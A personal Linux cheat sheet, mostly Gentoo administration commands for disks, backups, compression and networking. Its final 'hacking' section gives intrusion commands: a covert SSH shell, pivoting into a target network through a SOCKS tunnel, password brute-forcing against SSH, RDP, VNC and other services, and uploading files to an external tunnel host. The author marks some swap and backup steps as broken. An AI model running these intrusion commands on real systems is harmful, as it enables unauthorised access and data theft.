# GENTOOBER'S CLI CHEAT SHEET 4 A BUNCH OF THINGS

## USB ISO IMAGE CREATION:
```
dd bs=1M conv=fsync oflag=direct status=progress if=/home/gentoober/ISOS/ of=/dev/sda
```
## 'FIND' USES:
### GENERAL USAGE
```
find -maxdepth 4 -type f -name "*.txt" -not -path '*/.*'
```
#### EXCLUDING PATH FROM find SEARCHES
```
find / -type d -path '<excluded-path>' -prune -o -type f -iname '<file name>' -print
```
#### SEARCHING FOR 10M FILES:
```
find <path> -type f -size -10M <file/file_type>
```
### USING FIND TO EXCLUDE FILES:
```
find . -type f -name "*.rar" -exec rm {} \;
```
### SEC CHECK 
#### (FILES PERMISSIONS)
```
find / \( -perm -02000 -o -perm -04000 \) -ls | grep -v '.var\|.usr'
```
#### (RECENTLY EDITED FILES)
```
find / \( -newer /tmp -o -cnewer /tmp \) -ls
```

## FETCHES ALL USERS IN /ETC/PASSWD FILE:
```
cut -f1 -d: /etc/passwd
```

## CHECK ALL SERVICES RUNNING (FOREST FORMAT):
```
ps auxf
```
```
ps aef
```
```
ps aef --forest 
```
```
ps aux --forest
```

## USER LOGIN/LOGOUT CONNECTION INFO:
```
last -aiF
```

## REMOVING .OLD FROM KERNEL VERSIONS (RESTORING OLD KERNEL NAMES)
```
for file in *.old; do
  mv "$file" "${file%.old}"
done
```

## HDPARM - SECURE ERASE:
```
hdparm --user-master u --security-set-pass 12345 /dev/sda

hdparm --user-master u --security-erase 12345 /dev/sda
```

## UPPERCASING ANY MESSAGE
```
echo "<message>" | tr '[:lower:]' '[:upper:]'
```

## DETECTING DUPLICATE FILES
```
md5sum *.jpg | cut -c1-32 | sort | uniq -c | sort -nr
```
#### If there are no duplicates, all of the counts produced by uniq will be 1. Sort the results numerically from high to low, and any counts greater than 1 will appear at the top of the output:
```
$ md5sum *.jpg | cut -c1-32 | sort | uniq -c | sort -nr
 3 f6464ed766daca87ba407aede21c8fcc
 2 c7978522c58425f6af3f095ef1de1cd5
 2 146b163929b6533f02e91bdf21cb9563
 1 d8ad913044a51408ec1ed8a204ea9502
```
#### Identify the files having a given checksum by searching with grep:
```
md5sum *.jpg | grep f6464ed766daca87ba407aede21c8fcc
```
##### Output:
```
f6464ed766daca87ba407aede21c8fcc image001.jpg
f6464ed766daca87ba407aede21c8fcc image003.jpg
```
##### sha256sum is a better algorithm.

## [PORTAGE] 
### OMITTING LARGE PACKAGES FROM UPDATES / RECOMPS / &c
```
emerge -eq --exclude=sys-devel/gcc --exclude=sys-devel/llvm @world
```
### GETTING AN SPECIFIC VERSION A PACKAGE
#### to get a very specific version of a package (e.g.):
```
emerge -av =sys-kernel/vanilla-kernel-5.10.189
```
### /ETC/PORTAGE/ENV/GCC-GRAPHITE.CONF - GCC-GRAPHITE FLAGS
```
GRAPHITE="-floop-interchange -ftree-loop-distribution -floop-strip-mine -floop-block"
CFLAGS="-flto=jobserver ${GRAPHITE} -ftree-vectorize"
CXXFLAGS="${CFLAGS}"
LDFLAGS="${CFLAGS} -fuse-linker-plugin"
```
#### run:
```
binutils-config --linker ld.gold
```
##### https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html


## SSH TUNNEL PERSISTENCE TIP
```
ssh -o ServerAliveInterval=15 user@host
```

## REMUX VIDEO FOR WHATSAPP / TELEGRAM:
```
ffmpeg -i Buda\ -\ Aprenda\ a\ Silenciar\ a\ Mente.mp4 -vf "scale=640:-1" -b:v 1M -c:v libx264 -c:a aac -strict experimental Buda\ -\ Aprenda\ a\ Silenciar\ a\ Mente_wpp.mp4
```

## COMPRESSING / BACKUPING FILES
### LRZIP
```
tar cvf <DIR>.tar <DIR>/ --one-file-system --remove-files --use-compress-program="lrzip -l -L1 -p12 -N0"
```
### LZ4
```
tar cvf <DIR>.tar <DIR>/ --use-compress-program="lz4 --fast=12"
```
### DECOMPRESSING LZ4
```
lz4 -d <file>.tar -f <new-file>.tar && untar <file-real>.tar
```
```
for i in *.tar; do
    untar "$i"
done
```
### ZSTD/LZO compression / decompression
```
tar -cvf - diretório_origem | zstd -vz --ultra -o arquivo.tar.zst
zstd -d arquivo.tar.zst -o arquivo.tar
tar -xvf arquivo.tar
```
```
tar cf - <DIR>/ | lzop -v -9 - > DIR.tar.lzo
```

## DOWNLOADING PDF FILES w/ WGET # PDF is an example. one could download ANY files using similar syntax.
```
wget --mirror --no-parent --accept "*.pdf" <address>
```
### USING A LINK LIST:
```
wget -c -N -i links.txt 
```

## SETTING XDG DEFAULT APPS
```
xdg-mime default pcmanfm.desktop inode/directory
xdg-mime query default inode/directory
```
```
xdg-mime default sxiv.desktop image/jpeg
xdg-mime default sxiv.desktop image/png
xdg-mime default sxiv.desktop image/gif
```
```
xdg-mime default mpv.desktop audio/.* 
xdg-mime default mpv.desktop video/.* 
```
```
xdg-settings set default-web-browser brave-bin.desktop
xdg-settings set default-web-browser firefox.desktop
```
#### and so on...

## RSYNC COMMON USES
```
rsync -haAvWXz --delete --progress --exclude=<DIR>/ books/ /mnt/pendrives/backups/books/
```
```
rsync -havz origin.tar /<destiny>
```
```
rsync -havz origin.tar user@server:/<path>
```
### CLONING LINUX-DISTRO (FULL BACKUP):
```
rsync -haAXvWz --progress --delete --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*} / /mnt/backup
```
### $HOME:
```
rsync -haAvWXz --delete --progress --exclude=gentoober-library/ books/ /mnt/pendrives/backups/books/
```

## SOUND MANAGEMENT EXAMPLES (PULSEAUDIO)
```
pactl list short sources
```
#### e.g.:
```
pactl set-source-volume 48 25%
```

## SED USAGE EXAMPLES: 
```
sed -i 's/\/mnt\/gentoo/\/mnt\/backup/g' file.txt
```

## IPTABLES (BASIC CONFIG):
```
iptables -A INPUT -p icmp -j DROP && iptables -L
```

## SOME TRIVIAL & USEFUL DAILY COMMANDS
### SORT PROCESSES BY MEMORY USAGE
```
vmstat --unit M -as
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | less
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | awk '{ $5 = $5 / 1024; $6 = $6 / 1024; print }' | column -t | less
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | awk '{ $5 = $5 / (1024 * 1024); $6 = $6 / (1024 * 1024); print }' | column -t | less
```
### Redirecting output from a command to a file and monitoring the output in real-time:
#### Method 1
```
stdbuf -oL <command> | tee log_file.txt
```
#### Method 2
```
<command> | tee >(cat)
```
#### Method 3
```
unbuffer <command> | tee log_file.txt
```

## LVM CHEATSHEET # DO NOT confuse with LLVM (CLANG)
### A small "cheatsheet" with basic LVM (Logical Volume Manager) commands to create and remove Physical Volumes (PVs), Volume Groups (VGs), and Logical Volumes (LVs), as well as perform resizing:

#### Creating a Physical Volume (PV):
```
pvcreate /dev/sdx
```
#### Creating a Volume Group (VG):
```
vgcreate vg_name /dev/sdx
```
#### Adding a Physical Volume (PV) to a Volume Group (VG):
```
vgextend vg_name /dev/sdy
```
#### Creating a Logical Volume (LV):
```
lvcreate -L size -n lv_name vg_name
```
#### Resizing a Logical Volume (LV):
```
lvresize -L +size lv_path (ex: +10G)
lvresize -L -size lv_path (ex: -5G)
```
#### Resizing a file system while it's mounted:
```
resize2fs /dev/vg_name/lv_name # ext4
```
```
btrfs filesystem resize max /dev/vg_name/lv_name # btrfs
```
#### Removing a Logical Volume (LV):
```
lvremove lv_path
```
#### Removing a Volume Group (VG):
```
vgremove vg_name
```
#### Removing a Physical Volume (PV):
```
pvremove /dev/sdx
```

## LVM RESIZE (BTRFS USAGE)
```
lvextend -l +100%FREE /dev/mapper/gentoober-home
```
```
btrfs filesystem resize max /home/
```
```
btrfs filesystem defrag -r -v -clzo /mnt/backup/
```

## ENCRYTPTED [BTRFS] SWAP
### NORMAL SWAP FILE 
#### (no trouble section)
```
truncate -s 0 swapfile
```
```
chattr +C swapfile && lsattr swapfile
```
```
fallocate -l 11GB swapfile
```
```
chmod 0600 swapfile && ls -l swapfile
```
```
mkswap swapfile
```
```
swapon swapfile && free -h
```

### SWAP CREATION METHODS: 
#### (this section is a COMPLETE MESS and need fixing! DO NOT follow those steps if you don't know what you doing.)
```
dd bs=4M count=2560 if=/dev/zero of=swapfile conv=fsync oflag=direct status=progress
```
```
cryptsetup luksFormat --cipher aes-xts-plain64 --key-size 256 --hash sha256 --iter-time 2000 --use-random --verify-passphrase --type luks1 swapfile.img
```
```
losetup --find --show -O AUTOCLEAR swapfile.img
```
```
cryptsetup luksFormat swapfile.img
```
```
cryptsetup luksOpen --allow-discards swapfile swap_crypt
```
```
mkswap /dev/mapper/swap_crypt
```
```
swapon /dev/mapper/swap_crypt
```

## BLACKLISTING PCSPKR:
### [FILE] /ETC/MODPROBE.D/DISABLE-PCSPKR.CONF
```
vim /etc/modprobe.d/disable-pcspkr.conf
```
#### Insert the following content:
```
blacklist pcspkr
```
#### Apply:
```
sysctl -p # for sysctl.conf IN /etc
sysctl --system # for 99-local.conf IN /etc/sysctl.d/99-local.conf
```

## [IMAGEMAGICK] CONVERTING IMAGES:
```
jpg_files=$(find . -type f \( -iname \*.jpg -o -iname \*.jpeg \)) && echo $jpg_files

for file in $jpg_files; do
    convert -verbose -monitor "$file" "${file%.jpg}.png"
done

find . -type f -iname "*.jpg" -exec rm {} \;
```

## COMPILING SELF-MADE PROGRAMS WITH CLANG:
```
clang -O2 -march=znver2 -pipe -flto=thin -fuse-ld=lld -rtlib=compiler-rt -unwindlib=libunwind -Wl,--as-needed -Wl,-plugin-opt=O3 -Wl,--lto-O3 <file>.c -o <file>.bin
```

## RESIZING TMPFS
### /run/user/$(id -u)
```
mount -o remount,size=2.5G /run/user/1000
```

## INSTALLING NEW FONTS
```
unzip nome_do_arquivo.zip -d /usr/share/fonts/myfonts

fc-cache -f -v
```

## XDG TMPFS
### [FILE] /etc/profile.d/xdg_cache_home.sh
```
vim /etc/profile.d/xdg_cache_home.sh

if [ ${LOGNAME} ]; then
  export XDG_CACHE_HOME="/tmp/${LOGNAME}/.cache"
fi
```

## ENABLING TAP-TO-CLICK ON DWM:
```
mkdir -p /etc/X11/xorg.conf.d/

vim /etc/X11/xorg.conf.d/30-touchpad.conf
```
#### [FILE] 30-touchpad.conf:
```
Section "InputClass"
    Identifier "touchpad"
    Driver "libinput"
    MatchIsTouchpad "on"
    MatchProduct "MSFT0001:00 04F3:31BE Touchpad"
    Option "Tapping" "on"
EndSection
```

## Use a list of files for the mv command.
```
mv $(cat files_list.txt) PATH/
```

## AWK / SED / CUT # incomplete example, ignore it if you don't know what you doing.
```
echo "Only in SFW: 121212.png" | awk -F ': ' '{print $2}'
echo "Only in SFW: 121212.png" | awk '/Only in/ {print $4}'
cat wallpapers.log | sed -n 's/Only in \(.*\): \(.*\)/\1\2/p'
```

## Home Compressed Backup Creation (MESSED UP!)
```
shopt -s globstar; tar cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | zstd -vz -10 --ultra - > home-gentoober-backup-$DATE.tar.zst; shopt -u globstar
```
```
shopt -s globstar; tar -cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | xz -9 -c - > home_gentoober_backup-$(date +%d_%m_%Y).tar.xz; shopt -u globstar
```
#### HOME BACKUP (COMPRESSED)
```
shopt -s globstar; tar -cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | lz4 -vz --best -c - > home_gentoober_backup-$(date +%d_%m_%Y).tar.lz4; shopt -u globstar
```
#### BACKUP DECOMPRESSION
```
lz4 -d rootfs_backup-*.tar.lz4

tar --xattrs-include='*.*' --numeric-owner -xpvf home_gentoober_backup-*.tar /
```

## [SCRIPT] GENTOO MKSTAGE4:
```
#!/bin/bash

# Enable the globstar option to allow the use of ** for recursive file matching.
shopt -s globstar

# Set the backup_date variable to the current date (you can customize the date format as needed).
backup_date=$(date +"%d.%m.%Y")
backup_local="/mnt/backups/"
GREEN="\033[1;32m"
NC="\033[0m"

# Create a tar file with xattrs, excluding specific directories, and compress it with lz4.
tar cvpf - --xattrs --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*,/home/gentoober/videos/*} / | lz4 -vz --fast - > "${backup_local}stage4-gentoober-${backup_date}.tar.lz4"

# Disable the globstar option.
shopt -u globstar

# Display a message.
echo -e "${GREEN}Stage4 completed and moved to ${backup_local}/${NC}"
```

## HARDENING SMTP TIP:
```
postconf -e disable_vrfy_command=yes
```

## MISC NETWORKING USEFUL COMMANDS:
```
iwlist wlan0 scanning
```
```
traceroute -n <ADDR>
```
```
route -n
```
```
route add default gw <IP>
```
```
route del default gw <IP>
```
```
tcpdump -vv -i wlan0
```
```
tcpdump -vv -i wlan0 icmp -w icmp.pcap
```
```
tcpdump -r icmp.pcap
```
```
macchanger -r wlan0 # new
```
```
macchanger -p wlan0 # restore
```

## CLAMAV USAGE EXAMPLES
```
clamscan -r  / --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev --exclude-dir=/boot --exclude-dir=/var --exclude-dir=/tmp --exclude-dir=/run
```
```
clamscan -vr --max-filesize=2000M --max-scantime=2700 --cross-fs=yes --follow-dir-symlinks=2 --follow-file-symlinks=2 --official-db-only --scan-elf --scan-pdf --detect-pua --heuristic-alerts --move=/var/suspected/ --log=books.clamav.log /home/gentoober/books/
```
```
clamscan -vr --max-filesize=4000M --max-scantime=14400 --cross-fs=yes --follow-dir-symlinks=2 --follow-file-symlinks=2 --official-db-only --scan-elf --detect-pua --heuristic-alerts --move=/var/suspected/ --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev --exclude-dir=/boot --exclude-dir=/var --exclude-dir=/tmp --exclude-dir=/run --log=system.clamav.log /
```

## LISTING "1920x1080" IMAGES
```
identify -format "%w %h %i\n" *.png | awk '$1 == 1920 && $2 == 1080'
```
```
alias imglen='identify -format "%w %h %i\n" *.png | awk '$1 == 1920 && $2 == 1080' 
```
```
imglen | awk '{print $3}' > 1920 && mv-files'
```

## [BASH] RANDOM NUMBER GENERATION
```
head -c 4 /dev/urandom | od -N4 -tu4 | awk 'NR==1 {print $2 % 100000000 + 1}'
```
```
head -c4 /dev/urandom | od -A none -t x4
```
```
shuf -i 1-100000000 -n 1
```

## WATCH PROCESSES
```
watch -n 30 <command>
```
```
PROCESS=<PID/process_name/program>
while ps aux | grep -v grep | grep "$PROCESS" > /dev/null; do sleep 30; done && echo "A execução de $PROCESS foi concluída."
```

## MISC "HACKING" COMMANDS
### CREATING AN "INVISIBLE" SSH SESSION
```
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```

### ARP discover computers on the local network 
```
nmap -r -sn -PR 192.168.0.1/24
```

### ICMP discover computers on the local netowrk
```
NET="192.168.0"  # discover 192.168.0.1-192.168.0.254
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```

### Monitor every new TCP connection
```
tcpdump -n "tcp[tcpflags] == tcp-syn"
```

### Play a *bing*-noise for every new SSH connection
```
tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```

### Ascii output (for all large packets. Change to >40 if no TCP options are used).
```
tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
```

### Reverse HTTPS tunnel to forward public HTTPS requests to Port 8080 on this server
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
```
#### Or using remote.moe
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
```
#### Or using cloudflared
```
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```

### A simple STDIN/STDOUT pipe via HTTPS:
```
websocat -s 8080
```
#### and on the workstation use this command to connect:
```
websocat wss://<HTTPS-URL>
```
#### Or run a Socks-Proxy (via HTTPS): 
#### On the server
```
gost -L mws://:8080
```
#### On the Workstation
```
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
```

### Forward port 2222 to the server's port 22:
```
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
```
#### or use it as a Socks-Proxy:
```
gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
```

### Test the Socks-proxy:
```
curl -x socks5h://0 ipinfo.io
```

## Use any tool via Socks Proxy
### On the target's network:
#### Create a SOCKS proxy into the target's network.
#### Use gs-netcat but ssh -D would work as well.
```
gs-netcat -l -S
```
#### On your workstation:
#### Create a gsocket tunnel into the target's network:
```
gs-netcat -p 1080
```

### Use ProxyChain to access any host on the target's network: 
```
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychains -f pc.conf -q curl ipinfo.io
```

### Scan the router at 192.168.1.1
```
proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
```

### Start 10 nmaps in parallel:
```
seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
```

### SSH
```
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"
```

### Remote Desktop Protocol / RDP
```
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"
```

### FTP
```
hydra -P "${PLIST}" -l user "ftp://$T"
```

### POP3 (email)
```
nmap -p110,995 --script pop3-brute "$T"
```

### MySQL
```
nmap -p3306 --script mysql-brute "$T"
```

### PostgreSQL
```
nmap -p5432 --script pgsql-brute "$T"
```

### SMB (windows)
```
nmap --script smb-brute "$T"
```

### Telnet
```
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
```

### VNC
```
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"
```
#### VNC (with metasploit)
```
msfconsole
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.0.1
set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
run
```

### HTML basic auth
```
echo admin >user.txt                     # Try only 1 username
echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
nmap -p80 --script http-brute --script-args \
   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
   pentesteracademylab.appspot.com
```

## openssl encode
```
openssl base64 < file
```
### openssl decode (cut & paste the 1 line from above):
```
openssl base64 -d > file-COPY
```

## xxd encode
```
xxd -p < file
```
### xxd decode
```
xxd -p -r > file-COPY
```

## File transfer - using WebDAV
```
cloudflared tunnel --url localhost:8080 &
```
```
# [...]
# +--------------------------------------------------------------------------------------------+
# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
# |  https://example-foo-bar-lights.trycloudflare.com                                          |
# +--------------------------------------------------------------------------------------------+
# [...]
wsgidav --port=8080 --root=.  --auth=anonymous
# Upload a file to your workstation
curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
# Create a directory remotely
curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
# Create a directory hirachy remotely
find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
# Upload all *.c files (in parallel):
find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
```

## SHODAN quick search
```
IP=ip_address
curl https://internetdb.shodan.io/$IP | jq
```

## NMAP fast vulners scan
```
nmap -vv -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s $IP
```
```
nmap -r -sn -PR 192.168.0.1/24
```

## DISCOVER PUBIP
```
curl -s wtfismyip.com/json | jq
curl ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com
host myip.opendns.com resolver1.opendns.com
```

## DISCOVER GEOLOCATION
```
curl https://ipinfo.io/8.8.8.8 | jq
curl http://ip-api.com/8.8.8.8 | jq
curl https://cli.fyi/8.8.8.8 | jq
```
